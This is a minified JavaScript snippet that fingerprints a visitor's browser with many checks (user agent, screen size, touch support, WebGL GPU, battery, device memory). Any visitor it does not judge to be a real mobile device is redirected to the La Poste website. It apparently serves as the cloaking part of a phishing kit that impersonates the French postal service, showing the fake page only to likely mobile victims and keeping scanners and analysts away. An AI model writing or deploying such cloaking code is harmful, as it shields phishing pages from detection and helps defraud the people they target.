(function(){function isMobileDevice(){const userAgent=navigator.userAgent||navigator.vendor||window.opera;const isAndroid=/android/i.test(userAgent);const isIOS=/iPhone|iPad|iPod/i.test(userAgent);const isWindowsPhone=/windows phone/i.test(userAgent);return isAndroid||isIOS||isWindowsPhone}
function checkScreenSize(){const screenWidth=window.screen.width;const screenHeight=window.screen.height;const iPhoneScreenSizes=[{width:375,height:667},{width:414,height:736},{width:375,height:812},{width:414,height:896},{width:390,height:844},{width:428,height:926}];const isIPhoneSize=iPhoneScreenSizes.some(size=>(screenWidth===size.width&&screenHeight===size.height)||(screenWidth===size.height&&screenHeight===size.width));return(screenWidth<=768&&screenHeight<=1024)||isIPhoneSize}
function checkTouchSupport(){const hasTouch='ontouchstart' in window||navigator.maxTouchPoints>0||navigator.msMaxTouchPoints>0;return hasTouch&&matchMedia('(pointer: coarse)').matches}
function checkDeviceOrientation(){return typeof window.orientation!=="undefined"||'ondeviceorientation' in window}
function checkHardwareConcurrency(){return navigator.hardwareConcurrency&&navigator.hardwareConcurrency<=8}
function checkBatteryAPI(){if(navigator.userAgent.includes("iPhone")){return!0}
return'getBattery' in navigator||'battery' in navigator}
function checkMediaQuery(){return window.matchMedia("(max-device-width: 768px)").matches}
function checkMobileOnlyFeatures(){const mobileOnlyFeatures=['serviceWorker','Notification','geolocation','Bluetooth','vibrate','sendBeacon','requestIdleCallback','backgroundSync'];return mobileOnlyFeatures.some(feature=>feature in navigator)}
function checkPlugins(){return navigator.plugins.length===0}
function checkUserAgentConsistency(){const ua=navigator.userAgent.toLowerCase();const isAndroid=ua.indexOf("android")>-1;const isIOS=/(iphone|ipod|ipad)/.test(ua);const isMobileUA=isAndroid||isIOS;const uaProperties=['mobile','mobi','touch','tablet'];return uaProperties.some(prop=>ua.indexOf(prop)>-1)&&isMobileUA}
function checkWebGL(){const canvas=document.createElement('canvas');const gl=canvas.getContext('webgl')||canvas.getContext('experimental-webgl');if(!gl)return!1;const debugInfo=gl.getExtension('WEBGL_debug_renderer_info');const renderer=gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);const mobileGPUs=['Adreno','Mali','PowerVR','Apple','Tegra'];return mobileGPUs.some(gpu=>renderer.indexOf(gpu)!==-1)}
function checkMaxTouchPoints(){return navigator.maxTouchPoints>0&&navigator.maxTouchPoints<=10}
function checkDeviceMemory(){if(navigator.userAgent.includes("iPhone")){return navigator.deviceMemory&&navigator.deviceMemory<=4}
return navigator.deviceMemory&&navigator.deviceMemory<=8}
function checkNavigatorProperties(){const mobileProps=['platform','userAgent','language','languages'];return mobileProps.every(prop=>prop in navigator)}
function finalVerdict(){const checks=[isMobileDevice(),checkScreenSize(),checkTouchSupport(),checkDeviceOrientation(),checkHardwareConcurrency(),checkBatteryAPI(),checkMediaQuery(),checkMobileOnlyFeatures(),checkPlugins(),checkUserAgentConsistency(),checkWebGL(),checkMaxTouchPoints(),checkDeviceMemory(),checkNavigatorProperties()];const positiveChecks=checks.filter(check=>check);const reliability=(positiveChecks.length/checks.length)*100;return reliability>=80}
const isRealMobile=finalVerdict();if(!isRealMobile){if(my_env==='dev'){console.log("This is not a real mobile device.")}else{window.location.href='https://laposte.fr/'}}})()